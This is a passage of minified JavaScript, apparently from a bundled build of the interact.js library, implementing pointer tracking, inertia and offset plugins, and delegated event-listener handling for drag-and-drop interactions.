                      }) && !this._stopped),
                    this._interacting)
                  );
                },
              },
              {
                key: "pointerMove",
                value: function (r, l, c) {
                  this.simulation ||
                    (this.modification && this.modification.endResult) ||
                    this.updatePointer(r, l, c, !1);
                  var d,
                    h,
                    g =
                      this.coords.cur.page.x === this.coords.prev.page.x &&
                      this.coords.cur.page.y === this.coords.prev.page.y &&
                      this.coords.cur.client.x === this.coords.prev.client.x &&
                      this.coords.cur.client.y === this.coords.prev.client.y;
                  this.pointerIsDown &&
                    !this.pointerWasMoved &&
                    ((d =
                      this.coords.cur.client.x - this.coords.start.client.x),
                    (h = this.coords.cur.client.y - this.coords.start.client.y),
                    (this.pointerWasMoved =
                      Q(d, h) > this.pointerMoveTolerance));
                  var m,
                    A,
                    P,
                    b = this.getPointerIndex(r),
                    T = {
                      pointer: r,
                      pointerIndex: b,
                      pointerInfo: this.pointers[b],
                      event: l,
                      type: "move",
                      eventTarget: c,
                      dx: d,
                      dy: h,
                      duplicate: g,
                      interaction: this,
                    };
                  g ||
                    ((m = this.coords.velocity),
                    (A = this.coords.delta),
                    (P = Math.max(A.timeStamp / 1e3, 0.001)),
                    (m.page.x = A.page.x / P),
                    (m.page.y = A.page.y / P),
                    (m.client.x = A.client.x / P),
                    (m.client.y = A.client.y / P),
                    (m.timeStamp = P)),
                    this._scopeFire("interactions:move", T),
                    g ||
                      this.simulation ||
                      (this.interacting() && ((T.type = null), this.move(T)),
                      this.pointerWasMoved &&
                        X(this.coords.prev, this.coords.cur));
                },
              },
              {
                key: "move",
                value: function (r) {
                  (r && r.event) || z(this.coords.delta),
                    ((r = ae(
                      {
                        pointer: this._latestPointer.pointer,
                        event: this._latestPointer.event,
                        eventTarget: this._latestPointer.eventTarget,
                        interaction: this,
                      },
                      r || {}
                    )).phase = "move"),
                    this._doPhase(r);
                },
              },
              {
                key: "pointerUp",
                value: function (r, l, c, d) {
                  var h = this.getPointerIndex(r);
                  -1 === h && (h = this.updatePointer(r, l, c, !1));
                  var g = /cancel$/i.test(l.type) ? "cancel" : "up";
                  this._scopeFire("interactions:".concat(g), {
                    pointer: r,
                    pointerIndex: h,
                    pointerInfo: this.pointers[h],
                    event: l,
                    eventTarget: c,
                    type: g,
                    curEventTarget: d,
                    interaction: this,
                  }),
                    this.simulation || this.end(l),
                    this.removePointer(r, l);
                },
              },
              {
                key: "documentBlur",
                value: function (r) {
                  this.end(r),
                    this._scopeFire("interactions:blur", {
                      event: r,
                      type: "blur",
                      interaction: this,
                    });
                },
              },
              {
                key: "end",
                value: function (r) {
                  var l;
                  (this._ending = !0),
                    (r = r || this._latestPointer.event),
                    this.interacting() &&
                      (l = this._doPhase({
                        event: r,
                        interaction: this,
                        phase: "end",
                      })),
                    (this._ending = !1),
                    !0 === l && this.stop();
                },
              },
              {
                key: "currentAction",
                value: function () {
                  return this._interacting ? this.prepared.name : null;
                },
              },
              {
                key: "interacting",
                value: function () {
                  return this._interacting;
                },
              },
              {
                key: "stop",
                value: function () {
                  this._scopeFire("interactions:stop", { interaction: this }),
                    (this.interactable = this.element = null),
                    (this._interacting = !1),
                    (this._stopped = !0),
                    (this.prepared.name = this.prevEvent = null);
                },
              },
              {
                key: "getPointerIndex",
                value: function (r) {
                  var l = he(r);
                  return "mouse" === this.pointerType ||
                    "pen" === this.pointerType
                    ? this.pointers.length - 1
                    : bn(this.pointers, function (c) {
                        return c.id === l;
                      });
                },
              },
              {
                key: "getPointerInfo",
                value: function (r) {
                  return this.pointers[this.getPointerIndex(r)];
                },
              },
              {
                key: "updatePointer",
                value: function (r, l, c, d) {
                  var h,
                    g,
                    m,
                    A = he(r),
                    P = this.getPointerIndex(r),
                    b = this.pointers[P];
                  return (
                    (d = !1 !== d && (d || /(down|start)$/i.test(l.type))),
                    b
                      ? (b.pointer = r)
                      : ((b = new Gh(A, r, l, null, null)),
                        (P = this.pointers.length),
                        this.pointers.push(b)),
                    Te(
                      this.coords.cur,
                      this.pointers.map(function (T) {
                        return T.pointer;
                      }),
                      this._now()
                    ),
                    (h = this.coords.delta),
                    (g = this.coords.prev),
                    (m = this.coords.cur),
                    (h.page.x = m.page.x - g.page.x),
                    (h.page.y = m.page.y - g.page.y),
                    (h.client.x = m.client.x - g.client.x),
                    (h.client.y = m.client.y - g.client.y),
                    (h.timeStamp = m.timeStamp - g.timeStamp),
                    d &&
                      ((this.pointerIsDown = !0),
                      (b.downTime = this.coords.cur.timeStamp),
                      (b.downTarget = c),
                      V(this.downPointer, r),
                      this.interacting() ||
                        (X(this.coords.start, this.coords.cur),
                        X(this.coords.prev, this.coords.cur),
                        (this.downEvent = l),
                        (this.pointerWasMoved = !1))),
                    this._updateLatestPointer(r, l, c),
                    this._scopeFire("interactions:update-pointer", {
                      pointer: r,
                      event: l,
                      eventTarget: c,
                      down: d,
                      pointerInfo: b,
                      pointerIndex: P,
                      interaction: this,
                    }),
                    P
                  );
                },
              },
              {
                key: "removePointer",
                value: function (r, l) {
                  var c = this.getPointerIndex(r);
                  if (-1 !== c) {
                    var d = this.pointers[c];
                    this._scopeFire("interactions:remove-pointer", {
                      pointer: r,
                      event: l,
                      eventTarget: null,
                      pointerIndex: c,
                      pointerInfo: d,
                      interaction: this,
                    }),
                      this.pointers.splice(c, 1),
                      (this.pointerIsDown = !1);
                  }
                },
              },
              {
                key: "_updateLatestPointer",
                value: function (r, l, c) {
                  (this._latestPointer.pointer = r),
                    (this._latestPointer.event = l),
                    (this._latestPointer.eventTarget = c);
                },
              },
              {
                key: "destroy",
                value: function () {
                  (this._latestPointer.pointer = null),
                    (this._latestPointer.event = null),
                    (this._latestPointer.eventTarget = null);
                },
              },
              {
                key: "_createPreparedEvent",
                value: function (r, l, c, d) {
                  return new vs(
                    this,
                    r,
                    this.prepared.name,
                    l,
                    this.element,
                    c,
                    d
                  );
                },
              },
              {
                key: "_fireEvent",
                value: function (r) {
                  var l;
                  null == (l = this.interactable) || l.fire(r),
                    (!this.prevEvent ||
                      r.timeStamp >= this.prevEvent.timeStamp) &&
                      (this.prevEvent = r);
                },
              },
              {
                key: "_doPhase",
                value: function (r) {
                  var l = r.event,
                    c = r.phase,
                    d = r.preEnd,
                    h = r.type,
                    g = this.rect;
                  if (
                    (g &&
                      "move" === c &&
                      (S(
                        this.edges,
                        g,
                        this.coords.delta[this.interactable.options.deltaSource]
                      ),
                      (g.width = g.right - g.left),
                      (g.height = g.bottom - g.top)),
                    !1 ===
                      this._scopeFire(
                        "interactions:before-action-".concat(c),
                        r
                      ))
                  )
                    return !1;
                  var m = (r.iEvent = this._createPreparedEvent(l, c, d, h));
                  return (
                    this._scopeFire("interactions:action-".concat(c), r),
                    "start" === c && (this.prevEvent = m),
                    this._fireEvent(m),
                    this._scopeFire("interactions:after-action-".concat(c), r),
                    !0
                  );
                },
              },
              {
                key: "_now",
                value: function () {
                  return Date.now();
                },
              },
            ]),
            s
          );
        })();
      function Nl(s) {
        Bl(s.interaction);
      }
      function Bl(s) {
        if (!(l = s).offset.pending.x && !l.offset.pending.y) return !1;
        var l,
          r = s.offset.pending;
        return (
          ys(s.coords.cur, r),
          ys(s.coords.delta, r),
          S(s.edges, s.rect, r),
          (r.x = 0),
          (r.y = 0),
          !0
        );
      }
      function Nh(s) {
        var r = s.x,
          l = s.y;
        (this.offset.pending.x += r),
          (this.offset.pending.y += l),
          (this.offset.total.x += r),
          (this.offset.total.y += l);
      }
      function ys(s, r) {
        var l = s.page,
          c = s.client,
          d = r.x,
          h = r.y;
        (l.x += d), (l.y += h), (c.x += d), (c.y += h);
      }
      jl.offsetBy = "";
      var Jl = {
          id: "offset",
          before: ["modifiers", "pointer-events", "actions", "inertia"],
          install: function (s) {
            s.Interaction.prototype.offsetBy = Nh;
          },
          listeners: {
            "interactions:new": function (s) {
              s.interaction.offset = {
                total: { x: 0, y: 0 },
                pending: { x: 0, y: 0 },
              };
            },
            "interactions:update-pointer": function (s) {
              var r;
              (r = s.interaction).pointerIsDown &&
                (ys(r.coords.cur, r.offset.total),
                (r.offset.pending.x = 0),
                (r.offset.pending.y = 0));
            },
            "interactions:before-action-start": Nl,
            "interactions:before-action-move": Nl,
            "interactions:before-action-end": function (s) {
              var r = s.interaction;
              if (Bl(r)) return r.move({ offset: !0 }), r.end(), !1;
            },
            "interactions:stop": function (s) {
              var r = s.interaction;
              (r.offset.total.x = 0),
                (r.offset.total.y = 0),
                (r.offset.pending.x = 0),
                (r.offset.pending.y = 0);
            },
          },
        },
        Jh = (function () {
          function s(r) {
            a(this, s),
              (this.active = !1),
              (this.isModified = !1),
              (this.smoothEnd = !1),
              (this.allowResume = !1),
              (this.modification = void 0),
              (this.modifierCount = 0),
              (this.modifierArg = void 0),
              (this.startCoords = void 0),
              (this.t0 = 0),
              (this.v0 = 0),
              (this.te = 0),
              (this.targetOffset = void 0),
              (this.modifiedOffset = void 0),
              (this.currentOffset = void 0),
              (this.lambda_v0 = 0),
              (this.one_ve_v0 = 0),
              (this.timeout = void 0),
              (this.interaction = void 0),
              (this.interaction = r);
          }
          return (
            f(s, [
              {
                key: "start",
                value: function (r) {
                  var l = this.interaction,
                    c = Di(l);
                  if (!c || !c.enabled) return !1;
                  var d = l.coords.velocity.client,
                    h = Q(d.x, d.y),
                    g = this.modification || (this.modification = new ms(l));
                  if (
                    (g.copyFrom(l.modification),
                    (this.t0 = l._now()),
                    (this.allowResume = c.allowResume),
                    (this.v0 = h),
                    (this.currentOffset = { x: 0, y: 0 }),
                    (this.startCoords = l.coords.cur.page),
                    (this.modifierArg = g.fillArg({
                      pageCoords: this.startCoords,
                      preEnd: !0,
                      phase: "inertiastart",
                    })),
                    this.t0 - l.coords.cur.timeStamp < 50 &&
                      h > c.minSpeed &&
                      h > c.endSpeed)
                  )
                    this.startInertia();
                  else {
                    if (
                      ((g.result = g.setAll(this.modifierArg)),
                      !g.result.changed)
                    )
                      return !1;
                    this.startSmoothEnd();
                  }
                  return (
                    (l.modification.result.rect = null),
                    l.offsetBy(this.targetOffset),
                    l._doPhase({
                      interaction: l,
                      event: r,
                      phase: "inertiastart",
                    }),
                    l.offsetBy({
                      x: -this.targetOffset.x,
                      y: -this.targetOffset.y,
                    }),
                    (l.modification.result.rect = null),
                    (this.active = !0),
                    (l.simulation = this),
                    !0
                  );
                },
              },
              {
                key: "startInertia",
                value: function () {
                  var r = this,
                    l = this.interaction.coords.velocity.client,
                    c = Di(this.interaction),
                    d = c.resistance,
                    h = -Math.log(c.endSpeed / this.v0) / d;
                  (this.targetOffset = { x: (l.x - h) / d, y: (l.y - h) / d }),
                    (this.te = h),
                    (this.lambda_v0 = d / this.v0),
                    (this.one_ve_v0 = 1 - c.endSpeed / this.v0);
                  var g = this.modification,
                    m = this.modifierArg;
                  (m.pageCoords = {
                    x: this.startCoords.x + this.targetOffset.x,
                    y: this.startCoords.y + this.targetOffset.y,
                  }),
                    (g.result = g.setAll(m)),
                    g.result.changed &&
                      ((this.isModified = !0),
                      (this.modifiedOffset = {
                        x: this.targetOffset.x + g.result.delta.x,
                        y: this.targetOffset.y + g.result.delta.y,
                      })),
                    this.onNextFrame(function () {
                      return r.inertiaTick();
                    });
                },
              },
              {
                key: "startSmoothEnd",
                value: function () {
                  var r = this;
                  (this.smoothEnd = !0),
                    (this.isModified = !0),
                    (this.targetOffset = {
                      x: this.modification.result.delta.x,
                      y: this.modification.result.delta.y,
                    }),
                    this.onNextFrame(function () {
                      return r.smoothEndTick();
                    });
                },
              },
              {
                key: "onNextFrame",
                value: function (r) {
                  var l = this;
                  this.timeout = _n.request(function () {
                    l.active && r();
                  });
                },
              },
              {
                key: "inertiaTick",
                value: function () {
                  var r,
                    l,
                    c,
                    d,
                    h,
                    g,
                    m,
                    A = this,
                    P = this.interaction,
                    b = Di(P).resistance,
                    T = (P._now() - this.t0) / 1e3;
                  if (T < this.te) {
                    var O,
                      J =
                        1 -
                        (Math.exp(-b * T) - this.lambda_v0) / this.one_ve_v0;
                    this.isModified
                      ? ((r = 0),
                        (l = 0),
                        (c = this.targetOffset.x),
                        (d = this.targetOffset.y),
                        (h = this.modifiedOffset.x),
                        (g = this.modifiedOffset.y),
                        (O = { x: zl((m = J), r, c, h), y: zl(m, l, d, g) }))
                      : (O = {
                          x: this.targetOffset.x * J,
                          y: this.targetOffset.y * J,
                        });
                    var N = {
                      x: O.x - this.currentOffset.x,
                      y: O.y - this.currentOffset.y,
                    };
                    (this.currentOffset.x += N.x),
                      (this.currentOffset.y += N.y),
                      P.offsetBy(N),
                      P.move(),
                      this.onNextFrame(function () {
                        return A.inertiaTick();
                      });
                  } else
                    P.offsetBy({
                      x: this.modifiedOffset.x - this.currentOffset.x,
                      y: this.modifiedOffset.y - this.currentOffset.y,
                    }),
                      this.end();
                },
              },
              {
                key: "smoothEndTick",
                value: function () {
                  var r = this,
                    l = this.interaction,
                    c = l._now() - this.t0,
                    d = Di(l).smoothEndDuration;
                  if (c < d) {
                    var h = {
                        x: Yl(c, 0, this.targetOffset.x, d),
                        y: Yl(c, 0, this.targetOffset.y, d),
                      },
                      g = {
                        x: h.x - this.currentOffset.x,
                        y: h.y - this.currentOffset.y,
                      };
                    (this.currentOffset.x += g.x),
                      (this.currentOffset.y += g.y),
                      l.offsetBy(g),
                      l.move({ skipModifiers: this.modifierCount }),
                      this.onNextFrame(function () {
                        return r.smoothEndTick();
                      });
                  } else
                    l.offsetBy({
                      x: this.targetOffset.x - this.currentOffset.x,
                      y: this.targetOffset.y - this.currentOffset.y,
                    }),
                      this.end();
                },
              },
              {
                key: "resume",
                value: function (r) {
                  var l = r.pointer,
                    c = r.event,
                    d = r.eventTarget,
                    h = this.interaction;
                  h.offsetBy({
                    x: -this.currentOffset.x,
                    y: -this.currentOffset.y,
                  }),
                    h.updatePointer(l, c, d, !0),
                    h._doPhase({ interaction: h, event: c, phase: "resume" }),
                    X(h.coords.prev, h.coords.cur),
                    this.stop();
                },
              },
              {
                key: "end",
                value: function () {
                  this.interaction.move(), this.interaction.end(), this.stop();
                },
              },
              {
                key: "stop",
                value: function () {
                  (this.active = this.smoothEnd = !1),
                    (this.interaction.simulation = null),
                    _n.cancel(this.timeout);
                },
              },
            ]),
            s
          );
        })();
      function Di(s) {
        var r = s.interactable,
          l = s.prepared;
        return r && r.options && l.name && r.options[l.name].inertia;
      }
      function zl(s, r, l, c) {
        var d = 1 - s;
        return d * d * r + 2 * d * s * l + s * s * c;
      }
      function Yl(s, r, l, c) {
        return -l * (s /= c) * (s - 2) + r;
      }
      var Yh = {
        id: "inertia",
        before: ["modifiers", "actions"],
        install: function (s) {
          var r = s.defaults;
          s.usePlugin(Jl),
            s.usePlugin(Fl),
            (s.actions.phases.inertiastart = !0),
            (s.actions.phases.resume = !0),
            (r.perAction.inertia = {
              enabled: !1,
              resistance: 10,
              minSpeed: 100,
              endSpeed: 10,
              allowResume: !0,
              smoothEndDuration: 300,
            });
        },
        listeners: {
          "interactions:new": function (s) {
            var r = s.interaction;
            r.inertia = new Jh(r);
          },
          "interactions:before-action-end": function (s) {
            var r = s.interaction,
              l = s.event;
            return (
              (!r._interacting || r.simulation || !r.inertia.start(l)) && null
            );
          },
          "interactions:down": function (s) {
            var r = s.interaction,
              l = s.eventTarget,
              c = r.inertia;
            if (c.active)
              for (var d = l; M.element(d); ) {
                if (d === r.element) {
                  c.resume(s);
                  break;
                }
                d = et(d);
              }
          },
          "interactions:stop": function (s) {
            var r = s.interaction.inertia;
            r.active && r.stop();
          },
          "interactions:before-action-resume": function (s) {
            var r = s.interaction.modification;
            r.stop(s),
              r.start(s, s.interaction.coords.cur.page),
              r.applyToInteraction(s);
          },
          "interactions:before-action-inertiastart": function (s) {
            return s.interaction.modification.setAndApply(s);
          },
          "interactions:action-resume": Uo,
          "interactions:action-inertiastart": Uo,
          "interactions:after-action-inertiastart": function (s) {
            return s.interaction.modification.restoreInteractionCoords(s);
          },
          "interactions:after-action-resume": function (s) {
            return s.interaction.modification.restoreInteractionCoords(s);
          },
        },
      };
      function Ul(s, r) {
        for (var l = 0; l < r.length; l++) {
          var c = r[l];
          if (s.immediatePropagationStopped) break;
          c(s);
        }
      }
      var Hl = (function () {
          function s(r) {
            a(this, s),
              (this.options = void 0),
              (this.types = {}),
              (this.propagationStopped = !1),
              (this.immediatePropagationStopped = !1),
              (this.global = void 0),
              (this.options = ae({}, r || {}));
          }
          return (
            f(s, [
              {
                key: "fire",
                value: function (r) {
                  var l,
                    c = this.global;
                  (l = this.types[r.type]) && Ul(r, l),
                    !r.propagationStopped && c && (l = c[r.type]) && Ul(r, l);
                },
              },
              {
                key: "on",
                value: function (r, l) {
                  var c = F(r, l);
                  for (r in c) this.types[r] = st(this.types[r] || [], c[r]);
                },
              },
              {
                key: "off",
                value: function (r, l) {
                  var c = F(r, l);
                  for (r in c) {
                    var d = this.types[r];
                    if (d && d.length)
                      for (var h = 0, g = c[r]; h < g.length; h++) {
                        var m = g[h],
                          A = d.indexOf(m);
                        -1 !== A && d.splice(A, 1);
                      }
                  }
                },
              },
              {
                key: "getRect",
                value: function (r) {
                  return null;
                },
              },
            ]),
            s
          );
        })(),
        Uh = (function () {
          function s(r) {
            a(this, s),
              (this.currentTarget = void 0),
              (this.originalEvent = void 0),
              (this.type = void 0),
              (this.originalEvent = r),
              V(this, r);
          }
          return (
            f(s, [
              {
                key: "preventOriginalDefault",
                value: function () {
                  this.originalEvent.preventDefault();
                },
              },
              {
                key: "stopPropagation",
                value: function () {
                  this.originalEvent.stopPropagation();
                },
              },
              {
                key: "stopImmediatePropagation",
                value: function () {
                  this.originalEvent.stopImmediatePropagation();
                },
              },
            ]),
            s
          );
        })();
      function Ho(s) {
        return M.object(s)
          ? { capture: !!s.capture, passive: !!s.passive }
          : { capture: !!s, passive: !1 };
      }
      function Ii(s, r) {
        return (
          s === r ||
          ("boolean" == typeof s
            ? !!r.capture === s && !r.passive
            : !!s.capture == !!r.capture && !!s.passive == !!r.passive)
        );
      }
      var Hh = {
          id: "events",
          install: function (s) {
            var r,
              l = [],
              c = {},
              d = [],
              h = {
                add: g,
                remove: m,
                addDelegate: function (b, T, O, J, N) {
                  var H = Ho(N);
                  if (!c[O]) {
                    c[O] = [];
                    for (var re = 0; re < d.length; re++) {
                      var ne = d[re];
                      g(ne, O, A), g(ne, O, P, !0);
                    }
                  }
                  var ce = c[O],
                    be = zo(ce, function (ke) {
                      return ke.selector === b && ke.context === T;
                    });
                  be ||
                    ((be = { selector: b, context: T, listeners: [] }),
                    ce.push(be)),
                    be.listeners.push({ func: J, options: H });
                },
                removeDelegate: function (b, T, O, J, N) {
                  var H,
                    re = Ho(N),
                    ne = c[O],
                    ce = !1;
                  if (ne)
                    for (H = ne.length - 1; H >= 0; H--) {
                      var be = ne[H];
                      if (be.selector === b && be.context === T) {
                        for (
                          var ke = be.listeners, ge = ke.length - 1;
                          ge >= 0;
                          ge--
                        ) {
                          var _e = ke[ge];
                          if (_e.func === J && Ii(_e.options, re)) {
                            ke.splice(ge, 1),
                              ke.length ||
                                (ne.splice(H, 1), m(T, O, A), m(T, O, P, !0)),
                              (ce = !0);
                            break;
                          }
                        }
                        if (ce) break;
                      }
                    }
                },
                delegateListener: A,
                delegateUseCapture: P,
                delegatedEvents: c,
                documents: d,
                targets: l,
                supportsOptions: !1,
                supportsPassive: !1,
              };
            function g(b, T, O, J) {
              if (b.addEventListener) {
                var N = Ho(J),
                  H = zo(l, function (re) {
                    return re.eventTarget === b;
                  });
                H || ((H = { eventTarget: b, events: {} }), l.push(H)),
                  H.events[T] || (H.events[T] = []),
                  zo(H.events[T], function (re) {
                    return re.func === O && Ii(re.options, N);
                  }) ||
                    (b.addEventListener(
                      T,
                      O,
                      h.supportsOptions ? N : N.capture
                    ),
                    H.events[T].push({ func: O, options: N }));
              }
            }
            function m(b, T, O, J) {
              if (b.addEventListener && b.removeEventListener) {
                var N = bn(l, function (dt) {
                    return dt.eventTarget === b;
                  }),
                  H = l[N];
                if (H && H.events)
                  if ("all" !== T) {
                    var re = !1,
                      ne = H.events[T];
                    if (ne) {
                      if ("all" === O) {
                        for (var ce = ne.length - 1; ce >= 0; ce--) {
                          var be = ne[ce];
                          m(b, T, be.func, be.options);
                        }
                        return;
                      }
                      for (var ke = Ho(J), ge = 0; ge < ne.length; ge++) {
                        var _e = ne[ge];
                        if (_e.func === O && Ii(_e.options, ke)) {
                          b.removeEventListener(
                            T,
                            O,
                            h.supportsOptions ? ke : ke.capture
                          ),
                            ne.splice(ge, 1),
                            0 === ne.length && (delete H.events[T], (re = !0));
                          break;
                        }
                      }
                    }
                    re && !Object.keys(H.events).length && l.splice(N, 1);
                  } else
                    for (T in H.events)
                      H.events.hasOwnProperty(T) && m(b, T, "all");
              }
            }
            function A(b, T) {
              for (
                var O = Ho(T),
                  J = new Uh(b),
                  N = c[b.type],
                  H = An(b)[0],
                  re = H;
                M.element(re);

              ) {
                for (var ne = 0; ne < N.length; ne++) {
                  var ce = N[ne],
                    be = ce.selector,
                    ke = ce.context;
                  if (vt(re, be) && we(ke, H) && we(ke, re)) {
                    var ge = ce.listeners;
                    J.currentTarget = re;
                    for (var _e = 0; _e < ge.length; _e++) {
                      var dt = ge[_e];
                      Ii(dt.options, O) && dt.func(J);
                    }
                  }
                }
                re = et(re);
              }
            }
            function P(b) {
              return A(b, !0);
            }
            return (
              null == (r = s.document) ||
                r.createElement("div").addEventListener("test", null, {
                  get capture() {
                    return (h.supportsOptions = !0);
                  },
                  get passive() {
                    return (h.supportsPassive = !0);
                  },
                }),
              (s.events = h),
              h
            );
          },
        },
        ws = {
          methodOrder: ["simulationResume", "mouseOrPen", "hasPointer", "idle"],
          search: function (s) {
            for (var r = 0, l = ws.methodOrder; r < l.length; r++) {
              var c = l[r],
                d = ws[c](s);
              if (d) return d;
            }
            return null;
          },
          simulationResume: function (s) {
            var r = s.pointerType,
              l = s.eventType,
              c = s.eventTarget,
              d = s.scope;
            if (!/down|start/i.test(l)) return null;
            for (var h = 0, g = d.interactions.list; h < g.length; h++) {
              var m = g[h],
                A = c;
              if (
                m.simulation &&
                m.simulation.allowResume &&
                m.pointerType === r
              )
                for (; A; ) {
                  if (A === m.element) return m;
                  A = et(A);
                }
            }
            return null;
          },
          mouseOrPen: function (s) {
            var r,
              l = s.pointerId,
              c = s.pointerType,
              d = s.eventType,
              h = s.scope;
            if ("mouse" !== c && "pen" !== c) return null;
            for (var g = 0, m = h.interactions.list; g < m.length; g++) {
              var A = m[g];
              if (A.pointerType === c) {
                if (A.simulation && !Vl(A, l)) continue;
                if (A.interacting()) return A;
                r || (r = A);
              }
            }
            if (r) return r;
            for (var P = 0, b = h.interactions.list; P < b.length; P++) {
              var T = b[P];
              if (!(T.pointerType !== c || (/down/i.test(d) && T.simulation)))
                return T;
            }
            return null;
          },
          hasPointer: function (s) {
            for (
              var r = s.pointerId, l = 0, c = s.scope.interactions.list;
              l < c.length;
              l++
            ) {
              var d = c[l];
              if (Vl(d, r)) return d;
            }
            return null;
          },
          idle: function (s) {
            for (
              var r = s.pointerType, l = 0, c = s.scope.interactions.list;
              l < c.length;
              l++
            ) {
              var d = c[l];
              if (1 === d.pointers.length) {
                var h = d.interactable;
                if (h && (!h.options.gesture || !h.options.gesture.enabled))
                  continue;
              } else if (d.pointers.length >= 2) continue;
              if (!d.interacting() && r === d.pointerType) return d;
            }
            return null;
          },
        };
      function Vl(s, r) {
        return s.pointers.some(function (l) {
          return l.id === r;
        });
      }
      var Vh = ws,
        As = [
          "pointerDown",
          "pointerMove",
          "pointerUp",
          "updatePointer",
          "removePointer",
          "windowBlur",
        ];
      function Ql(s, r) {
        return function (l) {
          var c = r.interactions.list,
            d = Jo(l),
            h = An(l),
            g = h[0],
            m = h[1],
            A = [];
          if (/^touch/.test(l.type)) {
            r.prevTouchTime = r.now();
            for (var P = 0, b = l.changedTouches; P < b.length; P++) {
              var T = b[P],
                O = {
                  pointer: T,
                  pointerId: he(T),
                  pointerType: d,
                  eventType: l.type,
                  eventTarget: g,
                  curEventTarget: m,
                  scope: r,
                },
                J = Xl(O);
              A.push([O.pointer, O.eventTarget, O.curEventTarget, J]);
            }
          } else {
            var N = !1;
            if (!Z.supportsPointerEvent && /mouse/.test(l.type)) {
              for (var H = 0; H < c.length && !N; H++)
                N = "mouse" !== c[H].pointerType && c[H].pointerIsDown;
              N = N || r.now() - r.prevTouchTime < 500 || 0 === l.timeStamp;
            }
            if (!N) {
              var re = {
                  pointer: l,
                  pointerId: he(l),
                  pointerType: d,
                  eventType: l.type,
                  curEventTarget: m,
                  eventTarget: g,
                  scope: r,
                },
                ne = Xl(re);
              A.push([re.pointer, re.eventTarget, re.curEventTarget, ne]);
            }
          }
          for (var ce = 0; ce < A.length; ce++) {
            var be = A[ce],
              ke = be[0],
              ge = be[1],
              _e = be[2];
            be[3][s](ke, l, ge, _e);
          }
        };
      }
      function Xl(s) {
        var r = s.pointerType,
          l = s.scope,
          c = { interaction: Vh.search(s), searchDetails: s };
        return (
          l.fire("interactions:find", c),
          c.interaction || l.interactions.new({ pointerType: r })
        );
      }
      function bs(s, r) {
        var l = s.doc,
          c = s.scope,
          d = s.options,
          h = c.interactions.docEvents,
          g = c.events,
          m = g[r];
        for (var A in (c.browser.isIOS &&
          !d.events &&
          (d.events = { passive: !1 }),
        g.delegatedEvents))
          m(l, A, g.delegateListener), m(l, A, g.delegateUseCapture, !0);
        for (var P = d && d.events, b = 0; b < h.length; b++) {
          var T = h[b];
          m(l, T.type, T.listener, P);
        }
      }
      var Qh = {
          id: "core/interactions",
          install: function (s) {
            for (var r = {}, l = 0; l < As.length; l++) {
              var c = As[l];
              r[c] = Ql(c, s);
            }
            var d,
              h = Z.pEventTypes;
            function g() {
              for (var m = 0, A = s.interactions.list; m < A.length; m++) {
                var P = A[m];
                if (
                  P.pointerIsDown &&
                  "touch" === P.pointerType &&
                  !P._interacting
                )
                  for (
                    var b = function () {
                        var J = O[T];
                        s.documents.some(function (N) {
                          return we(N.doc, J.downTarget);
                        }) || P.removePointer(J.pointer, J.event);
                      },
                      T = 0,
                      O = P.pointers;
                    T < O.length;
                    T++
                  )
                    b();
              }
            }
            (d = Oe.PointerEvent
              ? [
                  { type: h.down, listener: g },
                  { type: h.down, listener: r.pointerDown },
                  { type: h.move, listener: r.pointerMove },
                  { type: h.up, listener: r.pointerUp },
                  { type: h.cancel, listener: r.pointerUp },
                ]
              : [
                  { type: "mousedown", listener: r.pointerDown },
                  { type: "mousemove", listener: r.pointerMove },
                  { type: "mouseup", listener: r.pointerUp },
                  { type: "touchstart", listener: g },
                  { type: "touchstart", listener: r.pointerDown },
                  { type: "touchmove", listener: r.pointerMove },
                  { type: "touchend", listener: r.pointerUp },
                  { type: "touchcancel", listener: r.pointerUp },
                ]).push({
              type: "blur",
              listener: function (m) {
                for (var A = 0, P = s.interactions.list; A < P.length; A++)
                  P[A].documentBlur(m);
              },
            }),
              (s.prevTouchTime = 0),
              (s.Interaction = (function (m) {
                v(P, m);
                var A = k(P);
                function P() {
                  return a(this, P), A.apply(this, arguments);
                }
                return (
                  f(P, [
                    {
                      key: "pointerMoveTolerance",
                      get: function () {
                        return s.interactions.pointerMoveTolerance;
                      },
                      set: function (b) {
                        s.interactions.pointerMoveTolerance = b;
                      },
                    },
                    {
                      key: "_now",
                      value: function () {
                        return s.now();
                      },
                    },
                  ]),
                  P
                );
              })(jh)),
              (s.interactions = {
                list: [],
                new: function (m) {
                  m.scopeFire = function (P, b) {
                    return s.fire(P, b);
                  };
                  var A = new s.Interaction(m);
                  return s.interactions.list.push(A), A;
                },
                listeners: r,
                docEvents: d,
                pointerMoveTolerance: 1,
              }),
              s.usePlugin(Gl);
          },
          listeners: {
            "scope:add-document": function (s) {
              return bs(s, "add");
            },
            "scope:remove-document": function (s) {
              return bs(s, "remove");
            },
            "interactable:unset": function (s, r) {
              for (
                var l = s.interactable, c = r.interactions.list.length - 1;
                c >= 0;
                c--
              ) {
                var d = r.interactions.list[c];
                d.interactable === l &&
                  (d.stop(),
                  r.fire("interactions:destroy", { interaction: d }),
                  d.destroy(),
                  r.interactions.list.length > 2 &&
                    r.interactions.list.splice(c, 1));
              }
            },
          },
          onDocSignal: bs,
          doOnInteractions: Ql,
          methodNames: As,
        },
        Xh = Qh,
        Pn = (function (s) {
          return (s[(s.On = 0)] = "On"), (s[(s.Off = 1)] = "Off"), s;
        })(Pn || {}),
        Zh = (function () {
          function s(r, l, c, d) {
            a(this, s),
              (this.target = void 0),
              (this.options = void 0),
              (this._actions = void 0),
              (this.events = new Hl()),
              (this._context = void 0),
              (this._win = void 0),
              (this._doc = void 0),
              (this._scopeEvents = void 0),
              (this._actions = l.actions),
              (this.target = r),
              (this._context = l.context || c),
              (this._win = C(ho(r) ? this._context : r)),
              (this._doc = this._win.document),
              (this._scopeEvents = d),
              this.set(l);
          }
          return (
            f(s, [
              {
                key: "_defaults",
                get: function () {
                  return { base: {}, perAction: {}, actions: {} };
                },
              },
              {
                key: "setOnEvents",
                value: function (r, l) {
                  return (
                    M.func(l.onstart) &&
                      this.on("".concat(r, "start"), l.onstart),
                    M.func(l.onmove) && this.on("".concat(r, "move"), l.onmove),
                    M.func(l.onend) && this.on("".concat(r, "end"), l.onend),
                    M.func(l.oninertiastart) &&
                      this.on("".concat(r, "inertiastart"), l.oninertiastart),
                    this
                  );
                },
              },
              {
                key: "updatePerActionListeners",
                value: function (r, l, c) {
                  var d,
                    h = this,
                    g =
                      null == (d = this._actions.map[r])
                        ? void 0
                        : d.filterEventType,
                    m = function (A) {
                      return (null == g || g(A)) && ki(A, h._actions);
                    };
                  (M.array(l) || M.object(l)) &&
                    this._onOff(Pn.Off, r, l, void 0, m),
                    (M.array(c) || M.object(c)) &&
